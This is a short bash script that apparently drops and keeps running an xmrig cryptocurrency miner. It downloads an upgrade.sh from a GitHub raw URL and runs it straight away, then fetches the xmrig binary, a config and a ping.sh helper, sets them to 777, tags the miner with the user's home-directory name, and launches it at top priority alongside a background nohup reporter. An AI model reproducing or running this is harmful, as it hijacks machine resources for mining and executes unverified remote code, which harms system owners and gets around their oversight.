#!/bin/bash

export TZ=America/Sao_Paulo

version='0.1'

path=$(pwd)
account=${path#/home/}

rm -rf upgrade.sh && wget -q https://raw.githubusercontent.com/Predador21/scripts/main/upgrade.sh && chmod 777 upgrade.sh && ./upgrade.sh $account

if [ ! -e 'xmrig' ]
then
   wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
fi

if [ ! -e 'config.json' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
   sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
fi

if [ ! -e 'ping.sh' ]
then
   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/ping.sh && chmod 777 ping.sh
fi

if ! pgrep xmrig > /dev/null
then
   nice -n -20 ./xmrig
fi

if ! pgrep ping.sh > /dev/null
then
   nohup ./ping.sh $account $version > /dev/null &
fi
